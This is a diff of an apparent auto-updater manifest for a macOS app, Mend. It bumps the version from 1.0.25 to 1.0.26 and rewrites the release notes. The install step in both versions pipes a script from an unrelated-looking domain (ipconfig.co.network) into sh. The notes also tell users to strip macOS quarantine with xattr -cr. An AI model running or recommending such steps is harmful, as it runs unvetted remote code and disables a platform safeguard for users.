@@ -1,14 +1,14 @@
 {
-  "version": "1.0.25",
-  "notes": "## Mend 1.0.25 — 08 Nov 2026\n\n- **Logs show where the time went.** After a line, a small ticking clock shows how long until the next line, when that was 5 seconds or more: amber, orange from 30 seconds, red from 2 minutes. A slow download or a long wait for the phone stands out at a glance.\n- **Device cards read better.** A device's whole name shows on up to two lines (\"Asha's iPhone\", not \"Asha's iPh…\"), and each card has a slowly moving band in the device's own colour along the top.\n- **An empty ring looks ready, not broken.** A ring at 0 (no fixes run yet) shows a slow dashed circle in its own colour instead of a blank grey track.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-08T11:58:29Z",
+  "version": "1.0.26",
+  "notes": "## Mend 1.0.26 — 08 Nov 2026\n\n- **Finder → Services reach the Mend you use.** Finder sends Services to whichever Mend.app macOS knows about, and a copy left in a build or download folder could catch the click and do nothing. Mend now registers itself as the one that answers, once per version, and refreshes the Services menu. The release script also makes macOS forget its build copies.\n- **New Finder service: Remove Duplicates with Mend.** Right-click a folder or disk → Services → Remove Duplicates with Mend. Mend scans it, keeps one file in each group (by your Keep rule, never the last copy), and asks once before moving the extra copies to the Trash. Find Duplicates with Mend still only shows them.\n- **Deleting contacts no longer fills the library.** A copy in the Mend library is made only when you tick **Keep a copy in the library** in the Select bar; otherwise deleted contacts are simply gone, and the confirmation says so.\n- **Copying to iCloud can be resumed, and no longer stops on one bad card.** A busy server or a dropped connection (429, 5xx, time-outs) is retried three times, slower each time. A contact that still won't go is set aside while the rest carry on. Accounts take four contacts at a time. An unfinished copy or move is remembered, even after quitting, and Copy & move shows **Resume**. Resuming skips every contact already in iCloud (same card id), so nothing is doubled. The summary says how many arrived, how many were already there, and how many didn't go and why.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-08T13:01:58Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SHlBVUtrNytOWFVNM21GbXgvS01FNG81RHNwZzhwMUZMY0JHMjR2My94azlEU2RWbzYwYnExM3lUM2NNd2lTMjY5YlA1YkpGZG1IZlBoM0lNMm1tdWdVPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MTM5MDc4CWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjI1CmhRZ1ZIVnFJbFhQWkhNWk9wbG5sUGoydzlOUHl0ZGdiY2FjWGxFaG1OUkNEcmZLMnpIamE4MDFZSk1aVVBIK2pBUHhWbFlTYkdNdzlDMUtJU2l0M0RBPT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.25/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SHdURTFBbUVMWS96MzZhRlRINlIvYWIzZU8vSlU5MGNtQWdWajJZVTh0UlhqbzF3NTZnb3Z5UEt2YzJLdHpWbk80UUJXQjY5NlloUXd0NCthR2lQZndrPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0MTQyODcxCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjI2Cm9mdDV1Wk9UeUJxUWcrQjJWeDl3Q0R5UWNqR2V6NHdiOFFXb3p1eXc2VWNDc1JTNUhaY2U3Q2QxWm9qSlhhMDRSNUduMzdFRFdtT25kUEpTQzczQURnPT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.26/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.25_aarch64.dmg"
+    "mac_arm": "Mend_1.0.26_aarch64.dmg"
   }
 }
